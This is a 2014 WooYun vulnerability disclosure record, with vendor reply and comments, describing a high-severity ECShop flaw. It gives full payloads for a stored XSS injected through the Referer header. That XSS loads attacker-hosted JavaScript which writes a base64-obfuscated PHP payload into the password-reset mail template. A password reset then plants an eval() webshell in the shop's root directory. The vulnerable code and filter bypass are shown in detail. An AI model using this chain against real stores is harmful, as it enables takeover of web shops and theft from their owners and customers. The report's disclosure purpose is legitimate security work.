{"id": 48673, "wybug_id": "wooyun-2014-082152", "wybug_title": "ecshop过滤不严导致上万网店可被getshell（需一定条件）", "wybug_corp": "ShopEx", "wybug_author": "Flow", "wybug_date": "2014-11-05 19:09", "wybug_open_date": "2014-12-20 19:10", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-20：\t细节向公众公开  简要描述： 我这里测试的是v2.7.3 和v2.7.4版本,都成功,目测其他版本也可以getshell 详细说明：  1.includes/lib_main.php过滤不严导致XSS看代码\nfunction visit_stats(){    if (isset($GLOBALS['_CFG']['visit_stats']) && $GLOBALS['_CFG']['visit_stats'] == 'off')    {        return;    }    $time = gmtime();    /* 检查客户端是否存在访问统计的cookie */    $visit_times = (!empty($_COOKIE['ECS']['visit_times'])) ? intval($_COOKIE['ECS']['visit_times']) + 1 : 1;    setcookie('ECS[visit_times]', $visit_times, $time + 86400 * 365, '/');    $browser  = get_user_browser();    $os       = get_os();    $ip       = real_ip();    $area     = ecs_geoip($ip);    /* 语言 */    if (!empty($_SERVER['HTTP_ACCEPT_LANGUAGE']))    {        $pos  = strpos($_SERVER['HTTP_ACCEPT_LANGUAGE'], ';');        $lang = addslashes(($pos !== false) ? substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, $pos) : $_SERVER['HTTP_ACCEPT_LANGUAGE']);    }    else    {        $lang = '';    }    /* 来源 */    if (!empty($_SERVER['HTTP_REFERER']) && strlen($_SERVER['HTTP_REFERER']) > 9)    {        $pos = strpos($_SERVER['HTTP_REFERER'], '/', 9);//        if ($pos !== false)        {            $domain = substr($_SERVER['HTTP_REFERER'], 0, $pos);            $path   = substr($_SERVER['HTTP_REFERER'], $pos);            /* 来源关键字 */            if (!empty($domain) && !empty($path))            {                save_searchengine_keyword($domain, $path);            }        }        else        {            $domain = $path = '';        }    }    else    {        $domain = $path = '';    }    $sql = 'INSERT INTO ' . $GLOBALS['ecs']->table('stats') . ' ( ' .                'ip_address, visit_times, browser, system, language, area, ' .                'referer_domain, referer_path, access_url, access_time' .            ') VALUES (' .                \"'$ip', '$visit_times', '$browser', '$os', '$lang', '$area', \".                \"'\" . addslashes($domain) .\"', '\" . addslashes($path) .\"', '\" . addslashes(PHP_SELF) .\"', '\" . $time . \"')\";    $GLOBALS['db']->query($sql);//$domain 从$_SERVER取出,只是简单的addslashes一下,没有过滤html标签}\n取出时也没有过滤,于是产生漏洞我们来构造一下REFERER访问首页,构造Referer值为'></graph>\"><IMG SRC='' onerror=javascript:alert('XSS')>/ 提交,如图,\n\n管理员查看流量分析时触发,如图\n\n\n\n2.打cookie多没意思,咱们getshell吧构造Referer值为--></script>/ 提交再次构造Referer值为'></graph>\"><script src=\"http:\\\\\\\\127.0.0.1\\\\demo.js\"><!--/提交(src后面的js地址必须用反斜杠)demo.js内容为\nAjax.call('mail_template.php?is_ajax=1&act=save_template', \"subject=%C3%DC%C2%EB%D5%D2%BB%D8&mail_type=0&tpl=1&content=%7B%24u%27%5D%3Bassert%28base64_decode%28%27ZmlsZV9wdXRfY29udGVudHMoJ3Rlc3QucGhwJyxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXeWRoSjEwcE96OCsnKSk7%3D%3D%27%29%29%3B+%2F%2F_var%5B%27%7D%3C%3F\" , a, \"POST\", \"JSON\");/*写php代码到取回密码邮件模板,会员执行取回密码时执行php代码*/Ajax.call('../user.php?act=get_password','act=send_pwd_email&user_name=vip&email=vip@ecshop.com', a , \"POST\", \"JSON\");/*前台取回密码.这里的vip和vip@ecshop.com为前台会员帐号和邮箱,我懒得注册了就用这个测试*/function a(){alert('');}\n触发后,会在网店根目录生成一个test.php的文件,内容为<?php @eval($_POST['a']);?>这里利用的是写php代码到取回密码邮件模板,执行取回密码操作时执行写入的代码漏洞在includes\\cls_template.php的fetch_str()函数\nfunction fetch_str($source)    {        if (!defined('ECS_ADMIN'))        {            $source = $this->smarty_prefilter_preCompile($source);        }        $source=preg_replace(\"/([^a-zA-Z0-9_]{1,1})+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\\()/is\", \"\", $source);//过滤了部分php关键词                 if(preg_match_all('~(<\\?(?:\\w+|=)?|\\?>|language\\s*=\\s*[\\\"\\']?php[\\\"\\']?)~is', $source, $sp_match))        {              $sp_match[1] = array_unique($sp_match[1]);            for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp < $for_max2; $curr_sp++)            {                $source = str_replace($sp_match[1][$curr_sp],'%%%SMARTYSP'.$curr_sp.'%%%',$source);            }             for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp < $for_max2; $curr_sp++)            {                 $source= str_replace('%%%SMARTYSP'.$curr_sp.'%%%', '<?php echo \\''.str_replace(\"'\", \"\\'\", $sp_match[1][$curr_sp]).'\\'; ?>'.\"\\n\", $source);            }         }                 return preg_replace(\"/{([^\\}\\{\\n]*)}/e\", \"\\$this->select('\\\\1');\", $source);    }\n我们可以构造代码到取回邮件模板:\n{$u'];assert(base64_decode('ZmlsZV9wdXRfY29udGVudHMoJ3Rlc3QucGhwJyxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBZ1FHVjJZV3dvSkY5UVQxTlVXeWRoSjEwcE96OCsnKSk7==')); //_var['}<?\n执行取回操作即可绕过过滤执行我们构造的代码   漏洞证明：     修复方案：  你们比我更懂   版权声明：转载请注明来源 Flow@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-11-06 10:16 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-05 19:11 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  我擦，好久没有看到ecshop的了，什么条件/    \n     2014-11-05 19:36 |    \t\tPower \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:22        | 还需要等待.........)\t\t \n  mark    \n     2014-11-05 19:46 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这个没闪电？    \n     2014-11-05 20:32 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:430 漏洞数:61        | 天涯何处无屌丝)\t\t \n  目测钱又到位了    \n     2014-11-05 21:10 |    \t\t0x7575 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:16        )\t\t \n  我去 感觉很久没看到ecshop了    \n     2014-11-05 21:30 |    \t\tWell \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:5        | 专注python Web渗透)\t\t \n  钱已经到位～～……    \n     2014-11-05 22:07 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  mark ,    \n     2014-11-06 01:58 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  闪电呢？钱呢？    \n     2014-11-06 07:44 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  这个要马    \n     2014-11-06 09:34 |    \t\tsysALong \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 电脑里的AV片 永远 和 电脑旁的卫生纸 成 ...)\t\t \n  少年需要的条件是：Magic_Quotes_Gpc：On   我叫雷锋不谢。    \n     2014-11-06 13:31 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  有防火墙的情况下 可以吗？求详情    \n     2014-11-06 14:38 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  @sysALong 这么奇葩，需要gpc开着？你确定？    \n     2014-11-21 22:50 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  原来是xss。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}